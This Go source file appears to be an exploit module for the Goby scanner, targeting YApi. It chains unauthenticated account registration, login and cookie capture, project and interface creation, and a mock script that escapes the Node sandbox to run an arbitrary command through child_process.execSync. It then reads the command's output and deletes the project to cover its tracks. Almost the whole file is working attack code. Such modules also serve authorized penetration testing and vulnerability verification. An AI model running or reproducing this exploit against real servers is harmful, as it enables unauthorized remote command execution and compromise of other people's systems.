package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "YApi Unauthorized Creation User And Mock RCE",
    "Description": "Yapi is not authorized to create an account and can create a task in the background. Any command can be specified by the command parameter",
    "Product": "YAPI",
    "Homepage": "https://github.com/YMFE/yapi",
    "DisclosureDate": "2021-07-06",
    "Author": "1291904552@qq.com",
    "GobyQuery": "app=YAPI",
    "Level": "3",
    "Impact": "",
    "Recommandation": "",
    "References": [
        "https://github.com/YMFE/yapi/issues/2099"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "email",
            "type": "input",
            "value": "YApi@gmail.com"
        },
        {
            "name": "password",
            "type": "input",
            "value": "YApi"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": [
            "YAPI"
        ],
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10206",
    "Recommendation": ""
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/api/user/reg"
			userpass := goutils.RandomHexString(4)
			fmt.Println(userpass)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = fmt.Sprintf("{\"email\":\"%s@gmail.com\",\"password\":\"%s\",\"username\":\"%s\"}", userpass, userpass, userpass)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, userpass)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri1 := "/api/user/reg"
			user := ss.Params["email"].(string)
			pass := ss.Params["password"].(string)
			cmd := ss.Params["cmd"].(string)
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Content-Type", "application/json")
			cfg1.Data = fmt.Sprintf("{\"email\":\"%s\",\"password\":\"%s\",\"username\":\"%s\"}", user, pass, user)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp.StatusCode == 200 {
					uri2 := "/api/user/login"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.Header.Store("Content-Type", "application/json")
					cfg2.Data = fmt.Sprintf("{\"email\":\"%s\",\"password\":\"%s\"}", user, pass)
					if resp2, err2 := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err2 == nil {
						if resp2.StatusCode == 200 && strings.Contains(resp2.Utf8Html, user) {
							YApiToken := regexp.MustCompile("Set-Cookie: _yapi_token=(.*?);").FindAllStringSubmatch(resp2.HeaderString.String(), -1)
							YApiUid := regexp.MustCompile("Set-Cookie: _yapi_uid=(.*?);").FindAllStringSubmatch(resp2.HeaderString.String(), -1)
							YApiCooike := "_yapi_token=" + YApiToken[0][1] + ";_yapi_uid=" + YApiUid[0][1]
							uri3 := "/api/group/list"
							cfg3 := httpclient.NewGetRequestConfig(uri3)
							cfg3.VerifyTls = false
							cfg3.Header.Store("Cookie", YApiCooike)
							if resp3, err3 := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err3 == nil {
								if resp3.StatusCode == 200 {
									YApiGroupId := regexp.MustCompile("\"_id\":(.*?),").FindAllStringSubmatch(resp3.Utf8Html, -1)
									uri4 := "/api/project/add"
									cfg4 := httpclient.NewPostRequestConfig(uri4)
									cfg4.VerifyTls = false
									cfg4.Header.Store("Content-Type", "application/json")
									cfg4.Header.Store("Cookie", YApiCooike)
									cfg4.Data = fmt.Sprintf("{\"name\":\"%s\",\"basepath\":\"/%s\",\"group_id\":\"%s\",\"icon\":\"code-o\",\"color\":\"red\",\"project_type\":\"private\"}", pass, pass, YApiGroupId[0][1])
									if resp4, err4 := httpclient.DoHttpRequest(expResult.HostInfo, cfg4); err4 == nil {
										if resp4.StatusCode == 200 {
											YApiId := regexp.MustCompile("\"tag\":\\[],\"_id\":(.*?),").FindAllStringSubmatch(resp4.Utf8Html, -1)
											uri5 := "/api/project/get?id=" + YApiId[0][1]
											cfg5 := httpclient.NewGetRequestConfig(uri5)
											cfg5.VerifyTls = false
											cfg5.Header.Store("Cookie", YApiCooike)
											if resp5, err5 := httpclient.DoHttpRequest(expResult.HostInfo, cfg5); err5 == nil {
												if resp5.StatusCode == 200 {
													YApiCatId := regexp.MustCompile("\"cat\":\\[{\"index\":0,\"_id\":(.*?),").FindAllStringSubmatch(resp5.Utf8Html, -1)
													uri6 := "/api/interface/add"
													cfg6 := httpclient.NewPostRequestConfig(uri6)
													cfg6.VerifyTls = false
													cfg6.Header.Store("Content-Type", "application/json")
													cfg6.Header.Store("Cookie", YApiCooike)
													cfg6.Data = fmt.Sprintf("{\"method\":\"GET\",\"catid\":\"%s\",\"title\":\"%s\",\"path\":\"/%s\",\"project_id\":%s}", YApiCatId[0][1], pass, pass, YApiId[0][1])
													if resp6, err6 := httpclient.DoHttpRequest(expResult.HostInfo, cfg6); err6 == nil {
														if resp6.StatusCode == 200 {
															YApiInterfaceId := regexp.MustCompile("\"req_body_form\":\\[],\"_id\":(.*?),").FindAllStringSubmatch(resp6.Utf8Html, -1)
															uri7 := "/api/plugin/advmock/save"
															cfg7 := httpclient.NewPostRequestConfig(uri7)
															cfg7.VerifyTls = false
															cfg7.Header.Store("Content-Type", "application/json")
															cfg7.Header.Store("Cookie", YApiCooike)
															cfg7.Data = fmt.Sprintf("{\"project_id\":\"%s\",\"interface_id\":\"%s\",\"mock_script\":\"const sandbox = this\\r\\nconst ObjectConstructor = this.constructor\\r\\nconst FunctionConstructor = ObjectConstructor.constructor\\r\\nconst myfun = FunctionConstructor('return process')\\r\\nconst process = myfun()\\r\\nmockJson = process.mainModule.require(\\\"child_process\\\").execSync(\\\"%s\\\").toString()\",\"enable\":true}", YApiId[0][1], YApiInterfaceId[0][1], cmd)
															if resp7, err7 := httpclient.DoHttpRequest(expResult.HostInfo, cfg7); err7 == nil {
																if resp7.StatusCode == 200 {
																	uri8 := "/mock/" + YApiId[0][1] + "/" + pass + "/" + pass
																	if resp8, err8 := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + uri8); err8 == nil {
																		expResult.Output = resp8.Utf8Html
																		uri9 := "/api/project/del"
																		cfg9 := httpclient.NewPostRequestConfig(uri9)
																		cfg9.VerifyTls = false
																		cfg9.Header.Store("Content-Type", "application/json")
																		cfg9.Header.Store("Cookie", YApiCooike)
																		cfg9.Data = fmt.Sprintf("{\"id\":%s}", YApiId[0][1])
																		if resp9, err9 := httpclient.DoHttpRequest(expResult.HostInfo, cfg9); err9 == nil {
																			if resp9.StatusCode == 200 {
																				expResult.Success = true
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}

						}
					}
				}
			}
			return expResult
		},
	))
}
